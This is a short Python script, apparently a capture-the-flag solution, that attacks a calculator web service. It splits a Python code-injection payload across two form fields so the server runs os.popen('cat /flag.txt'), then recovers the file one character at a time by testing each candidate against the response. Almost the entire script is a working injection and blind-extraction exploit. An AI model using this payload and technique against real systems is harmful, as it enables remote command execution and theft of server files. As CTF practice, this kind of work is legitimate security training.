import requests

url = 'https://maas.rars.win/calculator'
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
flag = ''
end = False
for i in range(0, 150):
    for c in chars:
        payload = {
            "mode": "arithmetic",
            "add": "+",
            "n1": "1 if __import__('os')",
            "n2": f".popen('cat /flag.txt').read()[{i}]=='{c}' else 'wrongcharacter'"
        }
        res = requests.post(url=url, data=payload)
        # print(res.text)
        if "&#39;wrongcharacter&#39;" in res.text:
            flag += c
            print(flag)
            if c == '}':
                end = True
            break
    # Check the end of flag
    if end:
        break
